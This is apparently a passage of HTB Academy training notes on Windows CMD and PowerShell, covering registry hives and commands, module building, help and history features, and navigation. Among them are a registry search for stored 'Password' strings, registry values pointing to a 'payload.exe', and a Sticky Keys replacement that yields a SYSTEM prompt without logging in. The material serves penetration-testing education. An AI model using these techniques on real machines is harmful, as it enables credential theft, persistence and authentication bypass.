<thead>
<tr>
<th><strong>Hives</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>HKEY_LOCAL_MACHINE</code> (<code>HKLM</code>)</td>
<td>This subtree contains information about the computer&#39;s physical state, such as hardware and operating system data, bus types, memory, device drivers, and more.</td>
</tr>
<tr>
<td><code>HKEY_CURRENT_CONFIG</code> (<code>HKCC</code>)</td>
<td>This section contains records for the host&#39;s current hardware profile. (shows the variance between current and default setups) Think of this as a redirection of the HKLM CurrentControlSet profile key.</td>
</tr>
<tr>
<td><code>HKEY_CLASSES_ROOT</code> (<code>HKCR</code>)</td>
<td>Filetype information, UI extensions, and backward compatibility settings are defined here.</td>
</tr>
<tr>
<td><code>HKEY_CURRENT_USER</code> (<code>HKCU</code>)</td>
<td>Value entries here define each user&#39;s specific OS and software settings. Roaming profile settings, including user preferences, are stored under HKCU.</td>
</tr>
<tr>
<td><code>HKEY_USERS</code> (<code>HKU</code>)</td>
<td>The local computer&#39;s default User profile and current user configuration settings are defined under HKU.</td>
</tr>
</tbody>
</table>
<p><strong>Registry Commands</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Get-Item -Path Registry::&lt;HIVE&gt;\Path-to-key\ &lt;PIPE&gt; Select-Object -ExpandProperty Property</code></td>
<td>See the sub-keys and properties of a registry key.</td>
</tr>
<tr>
<td><code>Get-ChildItem -Path &lt;HIVE&gt;:\Path-to-key -Recurse</code></td>
<td>Recursively search through a Key and all subkeys.</td>
</tr>
<tr>
<td><code>Get-ItemProperty -Path Registry::&lt;HIVE&gt;\Path-to-key\key</code></td>
<td>View the properties and values of a specific key.</td>
</tr>
<tr>
<td><code>REG QUERY &lt;HIVE&gt;\PATH\KEY</code></td>
<td>Use reg.exe to query the registry.</td>
</tr>
<tr>
<td><code>REG QUERY &lt;HIVE&gt; /F &quot;Password&quot; /t REG_SZ /S /K</code></td>
<td>Search for specific strings within the Registry hive.</td>
</tr>
<tr>
<td><code>New-Item -Path &lt;HIVE&gt;:\PATH\ -Name KeyName</code></td>
<td>Create a new Registry Key.</td>
</tr>
<tr>
<td><code>New-ItemProperty -Path &lt;HIVE&gt;:\PATH\KEY -Name &quot;ValueName&quot; -PropertyType String -Value &quot;C:\Users\htb-student\Downloads\payload.exe&quot;</code></td>
<td>Set a new Value pair within a registry Key.</td>
</tr>
<tr>
<td><code>REG add &quot;&lt;HIVE&gt;\PATH\KEY&quot; /v access /t REG_SZ /d &quot;C:\Users\htb-student\Downloads\payload.exe&quot;</code></td>
<td>Use Reg.exe to create a new key/value pair.</td>
</tr>
<tr>
<td><code>Remove-ItemProperty -Path &lt;HIVE&gt;:\PATH\KEY -Name &quot;name&quot;</code></td>
<td>Delete a key/value from the registry.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="powershell-scripting">PowerShell Scripting</h2>
<p><strong>PowerShell Extensions</strong></p>
<table data-header-hidden><thead><tr><th width="207"></th><th></th></tr></thead><tbody><tr><td><strong>Extension</strong></td><td><strong>Description</strong></td></tr><tr><td><code>PS1</code></td><td>The <em>.ps1 file extension represents executable PowerShell scripts.</td></tr><tr><td><code>PSM1</code></td><td>The </em>.psm1 file extension represents a PowerShell module file. It defines what the module is and what is contained within it.</td></tr><tr><td><code>PSD1</code></td><td>The *.psd1 is a PowerShell data file detailing the contents of a PowerShell module in a table of key/value pairs.</td></tr></tbody></table>

<p><strong>Commands For Building A Module</strong></p>
<p>| <strong>Command</strong> | <strong>Description</strong> |\
| <code>New-ModuleManifest \Path\&lt;filename&gt;</code> | This will create the initial manifest for a PowerShell module in the directory you specify. | | <code>ni &lt;filename&gt;.psm1 -ItemType File</code> | Creates a PowerShell module file. | | <code>Import-Module &lt;modulename&gt;</code> | Can be used to import a module into your PowerShell session or to specify modules to import when you run a PowerShell module. | | <code>$Variable = &lt;input&gt;</code> | Creates a callable variable and sets its value to the input specified. | | <code>function &lt;name&gt; { Tasks to run }</code> | Create a new function within a Module for use. | | <code># Comment block</code> | Creates a one-line comment in a script or Module. | | <code>&lt;# Comments #&gt;</code> | Creates a multi-line comment block. Everything that falls within the &lt;# #&gt; regardless of line count will be considered a part of the comment block. | | <code>Export-ModuleMember -Function &lt;name&gt; -Variable &lt;variablename&gt;</code> | Specifies that the functions and variables listed can be exported by other scripts, sessions, or modules. |</p>
<hr>
<h2 id="introduction">Introduction</h2>
<hr>
<p>The built-in command shell CMD.exe and PowerShell are two implementations included in all Windows hosts. These tools provide direct access to the operating system, automate routine tasks, and provide the user with granular control of any aspect of the computer and installed applications. This module will give us the knowledge, skills, and abilities to effectively administer Windows hosts via the command line.</p>
<p>From a penetration testing perspective, we will learn how to utilize built-in Windows tools and commands and third-party scripts and applications to help with reconnaissance, exploitation, and exfiltration of data from within a Windows environment as we move into more advanced modules within HTB Academy.</p>
<hr>
<h3 id="command-prompt-vs-powershell">Command Prompt Vs. PowerShell</h3>
<p>There are some key differences between Windows Command Prompt and PowerShell, which we will see throughout this module. One key difference is that you can run Command Prompt commands from a PowerShell console, but to run PowerShell commands from a Command Prompt, you would have to preface the command with <code>powershell</code> (i.e., <code>powershell get-alias</code>). The following table outlines some other key differences.</p>
<table>
<thead>
<tr>
<th>PowerShell</th>
<th>Command Prompt</th>
</tr>
</thead>
<tbody>
<tr>
<td>Introduced in 2006</td>
<td>Introduced in 1981</td>
</tr>
<tr>
<td>Can run both batch commands and PowerShell cmdlets</td>
<td>Can only run batch commands</td>
</tr>
<tr>
<td>Supports the use of command aliases</td>
<td>Does not support command aliases</td>
</tr>
<tr>
<td>Cmdlet output can be passed to other cmdlets</td>
<td>Command output cannot be passed to other commands</td>
</tr>
<tr>
<td>All output is in the form of an object</td>
<td>Output of commands is text</td>
</tr>
<tr>
<td>Able to execute a sequence of cmdlets in a script</td>
<td>A command must finish before the next command can run</td>
</tr>
<tr>
<td>Has an Integrated Scripting Environment (ISE)</td>
<td>Does not have an ISE</td>
</tr>
<tr>
<td>Can access programming libraries because it is built on the .NET framework</td>
<td>Cannot access these libraries</td>
</tr>
<tr>
<td>Can be run on Linux systems</td>
<td>Can only be run on Windows systems</td>
</tr>
</tbody>
</table>
<p>As we can see, the Command Prompt is a much more static way of interacting with the operating system, while PowerShell is a powerful scripting language that can be used for a wide variety of tasks and to create simple and very complex scripts.</p>
<h2 id="command-prompt-basics">Command Prompt Basics</h2>
<hr>
<p>The first step down the rabbit hole to developing our command-line kung fu is to dive into <code>cmd.exe</code>(the Command Prompt application). Let&#39;s begin our white-belt level training by going over what cmd.exe is, how to access it, and how the shell works.</p>
<hr>
<h3 id="cmd-exe">CMD.exe</h3>
<p>The Command Prompt, also known as <a href="https://https/learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd">cmd.exe</a> or CMD, is the default command line interpreter for the Windows operating system. Originally based on the <a href="https://www.techopedia.com/definition/1360/commandcom">COMMAND.COM</a> interpreter in DOS, the Command Prompt is ubiquitous across nearly all Windows operating systems. It allows users to input commands that are directly interpreted and then executed by the operating system. A single command can accomplish tasks such as changing a user&#39;s password or checking the status of network interfaces. This also reduces system resources, as graphical-based programs require more CPU and memory.</p>
<p>While often overshadowed by its sleek counterpart <a href="https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2">PowerShell</a>, knowledge of cmd.exe and its commands continue to pay dividends even in modern times.</p>
<p><code>Quick Story:</code> Several times during a pentest, I have run into hosts that had PowerShell locked down pretty well or made completely inaccessible through application control such as AppLocker. Using the Command Prompt, I could still leverage the host to acquire further access and elevate my privileges to continue the assessment. Modern operating systems have plenty of legacy software still embedded within the hosts. As admins and assessors alike, we must be aware of this and understand how to use them to our advantage.</p>
<hr>
<h3 id="accessing-cmd">Accessing CMD</h3>
<p>Before we can dig into the basic usage of Command Prompt, we have one fundamental question to answer first and foremost.</p>
<p><code>How do we access the Command Prompt?</code></p>
<p>There are multiple ways to access the Command Prompt on a Windows system. How you wish to access the prompt is up to personal preference as well as meeting specific criteria depending on the resources that are available at the time. Before explaining those criteria, there are some essential concepts to explain first.</p>
<p><strong>Local Access vs. Remote Access</strong></p>
<p>To help better explain these concepts, let us take a step back and remember our previous scenario:</p>
<p>Scenario: We are the system administrator at our company. As part of our daily duties and expectations, we must access machines from within our company&#39;s main headquarters and a branch office located in a different region to perform general maintenance and resolve technical issues. Let&#39;s say a user is having an issue with their machine, and you are called in to assist them. <code>How do we best access their machine to most effectively resolve their issue?</code></p>
<p>Several scenarios here are possible depending on the questions we ask ourselves. Is the user located in the same region as us? Is the user in the same building? Is the user&#39;s office within reasonable walking distance? Is the user actively connected and working on their machine? These questions will generally factor into our decision from a System Administrator&#39;s point of view regarding how we will attempt to access the machine in question. However, we are getting slightly ahead of ourselves, so let&#39;s describe what accessing a machine entails and the available access types.</p>
<p>Generally speaking, computer access can be categorized into two main categories:</p>
<p><strong>Local Access</strong></p>
<p>Local access is synonymous with having direct physical access ( or virtual in the instance of a Virtual Machine (VM)) to the machine itself. This level of access does not require the machine to be connected to a network, as it can be accessed directly through the peripherals(monitor, mouse, keyboard, etc.) connected to the machine. From the desktop, we can open up the command prompt by:</p>
<ul>
<li>Using the Windows key + <code>r</code> to bring up the run prompt, and then typing in <code>cmd</code>. OR</li>
<li>Accessing the executable from the drive path <code>C:\Windows\System32\cmd.exe</code>.</li>
</ul>
<p><strong>cmd.exe Initial Access</strong></p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-attr">[Version 10.0.19044.2006]</span>
(c) <span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Corporation</span>. <span class="hljs-keyword">All</span> <span class="hljs-selector-tag">rights</span> <span class="hljs-selector-tag">reserved</span>.

<span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Users</span>\<span class="hljs-selector-tag">htb</span>&gt;
</code></pre>
<p>We can run our commands, scripts, or other actions as needed.</p>
<p><strong>Remote Access:</strong></p>
<p>On the other hand, remote access is the equivalent of accessing the machine using virtual peripherals over the network. This level of access does not require direct physical access to the machine but requires the user to be connected to the same network or have a route to the machine they intend to access remotely. We can do this through the use of <code>telnet</code>(insecure and not recommended), Secure Shell (<code>SSH</code>), <code>PsExec</code>, <code>WinRM</code>, <code>RDP</code>, or other protocols as needed. For a sysadmin, remote management and access are a boon to our workflow. We would not have to go to the user&#39;s desk and physically access the host to perform our duties. This convenience for sysadmins can also implant a security threat into our network. If these remote access tools are not configured correctly, or a threat gains access to valid credentials, an attacker can now have wide-ranging access to our environments. We must maintain the proper balance of availability and integrity of our networks for a proper security posture.</p>
<hr>
<h3 id="basic-usage">Basic Usage</h3>
<p>Looking at the Command Prompt, what we see now is similar to what it was decades ago. Moreover, navigation of the Command Prompt has remained mostly unchanged as well. Navigating through the file system is like walking down a hallway filled with doors. As we move into one hallway(<code>directory</code>), we can look to see what is there (using the <code>dir</code> command), then either issue additional commands or keep moving. Below, we will cover the basic shell layout, how to walk the halls, and how to acquire a map to get the lay of the land.</p>
<p><strong>Using the dir Command</strong></p>
<h4 id="cmd-prompt">CMD Prompt</h4>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt; dir

 Volume <span class="hljs-keyword">in</span> drive C has no <span class="hljs-selector-tag">label</span>.
 Volume Serial Number is DAE9-<span class="hljs-number">5896</span>

 Directory of C:\Users\htb\Desktop

<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">59</span> PM    &lt;DIR&gt;          .
<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">59</span> PM    &lt;DIR&gt;          ..
<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">57</span> PM                 <span class="hljs-number">0</span> file1<span class="hljs-selector-class">.txt</span>
<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">57</span> PM                 <span class="hljs-number">0</span> file2<span class="hljs-selector-class">.txt</span>
<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">57</span> PM                 <span class="hljs-number">0</span> file3<span class="hljs-selector-class">.txt</span>
<span class="hljs-number">04</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">24</span> AM             <span class="hljs-number">2</span>,<span class="hljs-number">391</span> Microsoft Teams<span class="hljs-selector-class">.lnk</span>
<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">57</span> PM                 <span class="hljs-number">0</span> super-secret-sauce<span class="hljs-selector-class">.txt</span>
<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">59</span> PM                 <span class="hljs-number">0</span> write-secrets<span class="hljs-selector-class">.ps1</span>
               <span class="hljs-number">6</span> File(s)          <span class="hljs-number">2</span>,<span class="hljs-number">391</span> bytes
               <span class="hljs-number">2</span> Dir(s)  <span class="hljs-number">35</span>,<span class="hljs-number">102</span>,<span class="hljs-number">117</span>,<span class="hljs-number">888</span> bytes free
</code></pre>
<ol>
<li>The current path location (<code>C:\Users\Desktop</code>)</li>
<li>The command we have issued (<code>dir</code>)</li>
<li>The results of the command (<code>output below the line the command was issued on</code>)</li>
</ol>
<p>When looking at the Command Prompt, it is a basic request-response type conversation. We requested a directory listing of the current working directory, and the system responded with the appropriate output.</p>
<p><strong>Case Study: Windows Recovery</strong></p>
<p>In the event of a user lockout or some technical issue preventing/ inhibiting regular use of the machine, booting from a Windows installation disc gives us the option to boot to <code>Repair Mode</code>. From here, the user is provided access to a Command Prompt, allowing for command-line-based troubleshooting of the device.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/RecoveryMode.gif" alt="Accessing the Command Prompt via Recovery Mode"></p>
<p>While useful, this also poses a potential risk. For example, on this Windows 7 machine, we can use the recovery Command Prompt to tamper with the filesystem. Specifically, replacing the <code>Sticky Keys</code> (<code>sethc.exe</code>) binary with another copy of <code>cmd.exe</code></p>
<p>Once the machine is rebooted, we can press <code>Shift</code> five times on the Windows login screen to invoke <code>Sticky Keys</code>. Since the executable has been overwritten, what we get instead is another Command Prompt - this time with <code>NT AUTHORITY\SYSTEM</code> permissions. We have bypassed any authentication and now have access to the machine as the super user.</p>
<p>Now that we have a basic understanding of the Command Prompt and how to access it, let&#39;s move on. Our next section will cover how we can utilize the built-in <code>help</code> features of cmd.exe.</p>
<h2 id="getting-help">Getting Help</h2>
<hr>
<p>In the previous section, we were introduced to the general concepts of the Command Prompt and how we can access it. This section will expand upon the previous one by introducing the <code>help</code> functionality within Command Prompt, example output, and some additional resources and concepts.</p>
<p>The Command Prompt has a built-in <code>help</code> function that can provide us with detailed information about the available commands on our system and how to utilize those functions. In this section, we are going to cover the following in greater detail:</p>
<ul>
<li>How do we utilize the help functionality within Command Prompt?</li>
<li>Why utilizing the help functionality is essential?</li>
<li>Where can we find additional external resources for help?</li>
<li>How to utilize additional tips and tricks in the Command Prompt?</li>
</ul>
<hr>
<h3 id="how-to-get-help">How to Get Help</h3>
<p>When first looking at the Command Prompt interface, it can be overwhelming to stare at a blank prompt. Some initial questions might emerge, such as:</p>
<ul>
<li>What commands do I have access to?</li>
<li>How do I use these commands?</li>
</ul>
<p>Let&#39;s work on answering the initial question first. While utilizing the Command Prompt, finding help is as easy as typing <code>help</code>. Without any additional parameters, this command provides a list of built-in commands and basic information about each displayed command&#39;s usage. Let&#39;s take a look at it below.</p>
<p><strong>Default Help Usage</strong></p>
<pre><code class="lang-cmd-session">C:\htb&gt; help

For more information <span class="hljs-keyword">on</span> <span class="hljs-title">a</span> <span class="hljs-title">specific</span> <span class="hljs-title">command</span>, <span class="hljs-title">type</span> <span class="hljs-title">HELP</span> <span class="hljs-title">command-name</span>
ASSOC          Displays <span class="hljs-keyword">or</span> modifies <span class="hljs-built_in">file</span> extension associations.
ATTRIB         Displays <span class="hljs-keyword">or</span> changes <span class="hljs-built_in">file</span> attributes.
BREAK          Sets <span class="hljs-keyword">or</span> clears extended CTRL+C checking.
BCDEDIT        Sets properties <span class="hljs-keyword">in</span> boot database <span class="hljs-built_in">to</span> control boot loading.
CACLS          Displays <span class="hljs-keyword">or</span> modifies access control lists (ACLs) <span class="hljs-keyword">of</span> <span class="hljs-built_in">files</span>.
CALL           Calls <span class="hljs-literal">one</span> batch program <span class="hljs-built_in">from</span> another.
CD             Displays <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">or</span> changes <span class="hljs-keyword">the</span> current <span class="hljs-built_in">directory</span>.
CHCP           Displays <span class="hljs-keyword">or</span> sets <span class="hljs-keyword">the</span> active code page <span class="hljs-built_in">number</span>.
CHDIR          Displays <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">or</span> changes <span class="hljs-keyword">the</span> current <span class="hljs-built_in">directory</span>.
CHKDSK         Checks <span class="hljs-keyword">a</span> disk <span class="hljs-keyword">and</span> displays <span class="hljs-keyword">a</span> status report.

&lt;snip&gt;
</code></pre>
<p>From this output, we can see that it prints out a list of system commands (<code>built-ins</code>) and provides a basic description of its functionality. This is important because we can quickly and efficiently parse the list of built-in functions provided by the command prompt to find the function that suits our needs. From here, we can transition into answering the second question on how these commands are used. To print out detailed information about a particular command, we can issue the following: <code>help &lt;command name&gt;</code>.</p>
<p><strong>Help with Commands</strong></p>
<pre><code class="lang-cmd-session">C:\htb&gt; help <span class="hljs-built_in">time</span>

Displays <span class="hljs-keyword">or</span> sets <span class="hljs-keyword">the</span> <span class="hljs-keyword">system</span> <span class="hljs-built_in">time</span>.

TIME [/T | <span class="hljs-built_in">time</span>]

Type TIME <span class="hljs-keyword">with</span> no parameters <span class="hljs-built_in">to</span> display <span class="hljs-keyword">the</span> current <span class="hljs-built_in">time</span> setting <span class="hljs-keyword">and</span> <span class="hljs-keyword">a</span> prompt
<span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">new</span> <span class="hljs-literal">one</span>. Press ENTER <span class="hljs-built_in">to</span> keep <span class="hljs-keyword">the</span> same <span class="hljs-built_in">time</span>.

If Command Extensions are enabled, <span class="hljs-keyword">the</span> TIME <span class="hljs-keyword">command</span> <span class="hljs-title">supports</span>
<span class="hljs-keyword">the</span> /T <span class="hljs-keyword">switch</span> which tells <span class="hljs-keyword">the</span> <span class="hljs-keyword">command</span> <span class="hljs-title">to</span> <span class="hljs-title">just</span> <span class="hljs-title">output</span> <span class="hljs-title">the</span>
current <span class="hljs-built_in">time</span>, <span class="hljs-keyword">without</span> prompting <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">new</span> <span class="hljs-built_in">time</span>.
</code></pre>
<p>As we can see from the output above, when we issued the command <code>help time</code>, it printed the help details for time. This will work for any system command built-in but not for every command accessible on the system. Certain commands do not have a help page associated with them. However, they will redirect you to running the proper command to retrieve the desired information. For example, running <code>help ipconfig</code> will give us the following output.</p>
<p><strong>Detailed Output</strong></p>
<pre><code class="lang-cmd-session">C:<span class="hljs-string">\htb&gt;</span> help ipconfig

This command <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> supported <span class="hljs-keyword">by</span> the help utility. Try <span class="hljs-string">"ipconfig /?"</span>.
</code></pre>
<p>In the previous example, the help feature let us know that it could not provide more information as the help utility does not directly support it. However, utilizing the suggested command <code>ipconfig /?</code> will provide us with the information we need to utilize the command correctly. Be aware that several commands use the <code>/?</code> modifier interchangeably with help.</p>
<hr>
<h3 id="why-do-we-need-the-help-utility-">Why Do We Need the Help Utility?</h3>
<p>In the last section, we discussed the fundamental aspects of utilizing the help functionality from within the Command Prompt and interpreting some of its output. While understanding the technical details of how to use the <code>help</code> function is important, another fundamental concept here is the following:</p>
<p><code>Why does the help utility exist, and what use does it serve today when access to the Internet is so prevalent?</code></p>
<p>This question is multifaceted, so let us start breaking it down piece by piece. To better answer this question and provide a more thorough explanation, let us start by working through the following scenario:</p>
<p>Example: Imagine that you are tasked to assist in an internal on-site engagement for your company <code>GreenHorn</code>. You are immediately dropped into a Command Prompt session on a machine from within the internal network and have been tasked with enumerating the system. As per the rules of engagement, you have been stripped of any devices on your person and told that the firewall is blocking all outbound network traffic. You begin your enumeration on the system but need help remembering the syntax for a specific command you have in mind. You realize that you cannot reach the Internet by any means. <code>Where can you find it?</code></p>
<p>Although this scenario might seem slightly exaggerated, there will be scenarios similar to this one as an <code>attacker</code> where our network access will be heavily limited, monitored, or strictly unavailable. Sometimes, we do not have every command and all parameters and syntax memorized; however, we will still be expected to perform even under these limitations. In instances where we are expected to perform, we will need alternate ways to gather the information we need instead of relying on the Internet as a quick fix to our problems. Now that we have our scenario, let us look back and break down our original question:</p>
<p><code>Why does the help utility exist?</code></p>
<p>The <code>help</code> utility serves as an <code>offline</code> manual for <code>CMD</code> and <code>DOS</code> compatible Windows operating system commands. <code>Offline</code> refers to the fact that this utility can be used on a system without network access. For those familiar with the <a href="https://academy.hackthebox.com/module/18/section/67">Linux Fundamentals</a> Module, this utility is very similar to the <code>Man</code> pages on <code>Linux</code> based systems. Now that we understand why the help utility exists, we can cover the second part of the original question:</p>
<p><code>What use does it serve today when access to the Internet is so prevalent?</code></p>
<p>As shown in our scenario, there will be times when we may not have direct access to the Internet. The <code>help</code> utility is meant to bridge that gap when we need assistance with commands or specific syntax for said commands on our system and may not have the external resources available to ask for help. This does not imply that the <code>Internet</code> is not a valuable tool to use in engagements. However, if we do not have the luxury of searching for answers to our questions, we need some way to retrieve said information.</p>
<hr>
<h3 id="where-can-you-find-additional-help-">Where Can You Find Additional Help?</h3>
<p>In the previous section, we discussed the importance of utilizing the help system built into the Command Prompt, especially in an environment where external network traffic is non-existent or limited. However, assuming we have access to the Internet, there are dozens of <code>online resources</code> at our disposal for additional help regarding the Command Prompt. As stated before, the Internet is an extremely valuable tool and should be utilized to its fullest extent, especially if unrestricted access exists. To help enhance our understanding of CMD and alleviate some of the time sink involved with searching for material, here are a couple of <code>CMD.exe</code> command references where we can learn more about what can be done with our command shell.</p>
<p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands">Microsoft Documentation</a> has a complete listing of the commands that can be issued within the command-line interpreter as well as detailed descriptions of how to use them. Think of it as an online version of the Man pages.</p>
<p><a href="https://ss64.com/nt/">ss64</a> Is a handy quick reference for anything command-line related, including cmd, PowerShell, Bash, and more.</p>
<p>This is a partial list of resources; however, these should provide a good baseline for working with the Command Prompt.</p>
<hr>
<h3 id="basic-tips-tricks">Basic Tips &amp; Tricks</h3>
<p>Now that we have a general understanding of how we can obtain help from external resources, let&#39;s finish off strong by introducing some essential tips and tricks for interacting with the Command Prompt.</p>
<p><strong>Clear Your Screen</strong></p>
<p>There are times during our interaction with the <code>command prompt</code> when the amount of <code>output</code> provided to us through multiple commands overcrowding the screen and becomes an unusable mess of information. In this case, we need some way to <code>clear</code> the screen and provide us with an empty prompt. We can use the command <code>cls</code> to clear our terminal window of our previous results. This comes in handy when we need to refresh our screen and want to avoid fighting to read the terminal and figuring out where our current output starts and the old input ends.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/clear\_screen.gif" alt="image"></p>
<p>We can see from the GIF above that our terminal was packed, and we issued the <code>cls</code> command providing us with a <code>blank slate</code>.</p>
<p><strong>History</strong></p>
<p>Previously, we expanded upon clearing the output from the Command Prompt session using <code>cls</code>. Although that information has been cleared from the screen&#39;s output, we can still retrieve the commands that were run up to that point. This is due to a nifty feature built into the Command Prompt known as <code>Command History</code>.</p>
<p>Command history is a dynamic thing. It allows us to <code>view previously ran commands</code> in our Command Prompt&#39;s <code>current active session</code>. To do this, CMD provides us with several different methods of interacting with our command history. For example, we can use the arrow keys to move up and down through our history, the <code>page up</code> and <code>page down</code> keys, and if working on a physical Windows host, you can use the <code>function</code> keys to interact with your session history. The last way we can view our history is by utilizing the command <code>doskey /history</code>. <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/doskey">Doskey</a> is an MS-DOS utility that keeps a history of commands issued and allows them to be referenced again.</p>
<p><strong>doskey /history</strong></p>
<pre><code class="lang-cmd-session">C:\htb&gt; doskey /<span class="hljs-keyword">history</span>

systeminfo
ipconfig /<span class="hljs-keyword">all</span>
cls
ipconfig /<span class="hljs-keyword">all</span>
systeminfo
cls
<span class="hljs-keyword">history</span>
<span class="hljs-keyword">help</span>
doskey /<span class="hljs-keyword">history</span>
ping <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>
doskey /<span class="hljs-keyword">history</span>
</code></pre>
<p>From the output provided above, we can view a list of <code>commands</code> that were run before our original command. This is important and incredibly useful, especially if you are constantly clearing your screen and need to rerun a previous command to collect its <code>output</code>. Interacting and viewing all previously run commands will save you extra time, energy, and heartache.</p>
<p><strong>Useful Keys &amp; Commands for Terminal History</strong></p>
<p>It would be helpful to have some way of remembering some of the key functionality provided by our terminal history. With this in mind, the table below shows a list of some of the most valuable functions and commands that can be run to interact with our session history. This list is not exhaustive. For example, the function keys F1 - F9 all serve a purpose when working with history.</p>
<table data-header-hidden><thead><tr><th width="217" align="center"></th><th></th></tr></thead><tbody><tr><td align="center"><strong>Key/Command</strong></td><td><strong>Description</strong></td></tr><tr><td align="center">doskey /history</td><td>doskey /history will print the session&#39;s command history to the terminal or output it to a file when specified.</td></tr><tr><td align="center">page up</td><td>Places the first command in our session history to the prompt.</td></tr><tr><td align="center">page down</td><td>Places the last command in history to the prompt.</td></tr><tr><td align="center">⇧</td><td>Allows us to scroll up through our command history to view previously run commands.</td></tr><tr><td align="center">⇩</td><td>Allows us to scroll down to our most recent commands run.</td></tr><tr><td align="center">⇨</td><td>Types the previous command to prompt one character at a time.</td></tr><tr><td align="center">⇦</td><td>N/A</td></tr><tr><td align="center">F3</td><td>Will retype the entire previous entry to our prompt.</td></tr><tr><td align="center">F5</td><td>Pressing F5 multiple times will allow you to cycle through previous commands.</td></tr><tr><td align="center">F7</td><td>Opens an interactive list of previous commands.</td></tr><tr><td align="center">F9</td><td>Enters a command to our prompt based on the number specified. The number corresponds to the commands place in our history.</td></tr></tbody></table>

<p>One thing to remember is that unlike Bash or other shells, CMD does not keep a persistent record of the commands you issue through sessions. So once you close that instance, that history is gone. To save a copy of our issued commands, we can use <code>doskey</code> again to output the history to a file, show it on screen, and then copy it.</p>
<p><strong>Exit a Running Process</strong></p>
<p>At some point in our journey working with the <code>Command Prompt</code>, there will be times when we will need to be able to <code>interrupt</code> an actively running process, effectively killing it. This can be due to many different factors. However, a lot of the time, we might have the information that we need from a currently running command or find ourselves dealing with an application that&#39;s locking up unexpectedly. Thus, we need some way of interrupting our current session and any process running in it. Take the following as an example:</p>
<pre><code class="lang-cmd-session">C:\htb&gt; ping <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>

Pinging <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span> <span class="hljs-keyword">with</span> <span class="hljs-number">32</span> bytes of data:
Reply from <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>: <span class="hljs-attr">bytes=32</span> <span class="hljs-attr">time=22ms</span> <span class="hljs-attr">TTL=114</span>
Reply from <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>: <span class="hljs-attr">bytes=32</span> <span class="hljs-attr">time=25ms</span> <span class="hljs-attr">TTL=114</span>

Ping statistics for <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>:
    Packets: <span class="hljs-attr">Sent</span> = <span class="hljs-number">2</span>, <span class="hljs-attr">Received</span> = <span class="hljs-number">2</span>, <span class="hljs-attr">Lost</span> = <span class="hljs-number">0</span> (<span class="hljs-number">0</span>% loss),
Approximate round trip times <span class="hljs-keyword">in</span> milli-seconds:
    <span class="hljs-attr">Minimum</span> = <span class="hljs-number">22</span>ms, <span class="hljs-attr">Maximum</span> = <span class="hljs-number">25</span>ms, <span class="hljs-attr">Average</span> = <span class="hljs-number">23</span>ms
Control-C
^C
</code></pre>
<p>When running a command or process we want to interrupt, we can do so by pressing the <code>ctrl+c</code> key combination. As previously stated, this is useful for stopping a currently running process that may be non-responsive or just something we want to be completed immediately. Remember that whatever was running will be incomplete and may need more time to close itself out properly, so always be wary of what you are interrupting.</p>
<p>Now that we understand how to utilize the command prompt and its basic help functionality let us keep pressing forward and look at how we can begin navigating our system through the Command Prompt.</p>
<h2 id="system-navigation">System Navigation</h2>
<hr>
<p>So far, most of what we have covered is introductory information to help us get a basic understanding and feel of the Command Prompt. Continuing with that flow, our next goal should be utilizing our Command Prompt to successfully <code>navigate</code> and move around on the system. In this section, we attempt to conquer our surroundings by:</p>
<ul>
<li>Listing A Directory</li>
<li>Finding Our Place on the System</li>
<li>Moving Around using CD</li>
<li>Exploring the File System</li>
</ul>
<p>Additionally, at the end of the section, we will briefly look into certain directories on a Windows host that might seem juicy from the adversary&#39;s perspective. Keeping all of that in mind, let us dive right in and explore the system together.</p>
<hr>
<h3 id="listing-a-directory">Listing A Directory</h3>
<p>One of the easiest things we can do when initially poking around on a Windows host is to get a listing of the directory we are currently working in. We do that with the <code>dir</code> command.</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt; dir

 Volume <span class="hljs-keyword">in</span> drive C has no <span class="hljs-selector-tag">label</span>.
